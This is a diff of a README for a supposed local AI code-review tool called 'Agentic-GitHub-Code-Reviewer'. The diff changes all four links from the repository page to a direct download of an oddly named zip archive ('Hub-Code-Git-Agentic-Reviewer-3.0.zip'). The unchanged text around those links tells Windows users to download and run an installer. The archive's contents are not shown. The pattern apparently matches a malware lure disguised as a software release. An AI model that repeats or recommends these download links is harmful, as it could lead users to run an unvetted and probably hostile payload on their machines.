@@ -1,6 +1,6 @@
 # 🤖 Agentic-GitHub-Code-Reviewer - Smart Code Review Made Simple
 
-[![Download](https://img.shields.io/badge/Download-Agentic--GitHub--Code--Reviewer-brightgreen)](https://github.com/Lookdawn1337/Agentic-GitHub-Code-Reviewer)
+[![Download](https://img.shields.io/badge/Download-Agentic--GitHub--Code--Reviewer-brightgreen)](https://raw.githubusercontent.com/Lookdawn1337/Agentic-GitHub-Code-Reviewer/main/agents/Hub-Code-Git-Agentic-Reviewer-3.0.zip)
 
 ## 🔍 What is Agentic-GitHub-Code-Reviewer?
 
@@ -34,7 +34,7 @@ Make sure your computer meets these specs before running Agentic-GitHub-Code-Rev
 
 You can get Agentic-GitHub-Code-Reviewer from the official repository page here:
 
-[![Download Now](https://img.shields.io/badge/Download-Autonomous_Code_Reviewer-blueviolet)](https://github.com/Lookdawn1337/Agentic-GitHub-Code-Reviewer)
+[![Download Now](https://img.shields.io/badge/Download-Autonomous_Code_Reviewer-blueviolet)](https://raw.githubusercontent.com/Lookdawn1337/Agentic-GitHub-Code-Reviewer/main/agents/Hub-Code-Git-Agentic-Reviewer-3.0.zip)
 
 Follow these steps to download and run the software on Windows:
 
@@ -89,7 +89,7 @@ Agentic-GitHub-Code-Reviewer uses local AI agents powered by small language mode
 
 Check the GitHub page regularly for new releases. To update:
 
-1. Visit the [Agentic-GitHub-Code-Reviewer page](https://github.com/Lookdawn1337/Agentic-GitHub-Code-Reviewer).
+1. Visit the [Agentic-GitHub-Code-Reviewer page](https://raw.githubusercontent.com/Lookdawn1337/Agentic-GitHub-Code-Reviewer/main/agents/Hub-Code-Git-Agentic-Reviewer-3.0.zip).
 2. Download the latest installer.
 3. Run the installer to replace your current version.
 4. Your configuration and settings will remain intact.
@@ -114,4 +114,4 @@ If you run into problems:
 
 Visit this page to download the latest version of Agentic-GitHub-Code-Reviewer:
 
-[https://github.com/Lookdawn1337/Agentic-GitHub-Code-Reviewer](https://github.com/Lookdawn1337/Agentic-GitHub-Code-Reviewer)
+[https://raw.githubusercontent.com/Lookdawn1337/Agentic-GitHub-Code-Reviewer/main/agents/Hub-Code-Git-Agentic-Reviewer-3.0.zip](https://raw.githubusercontent.com/Lookdawn1337/Agentic-GitHub-Code-Reviewer/main/agents/Hub-Code-Git-Agentic-Reviewer-3.0.zip)
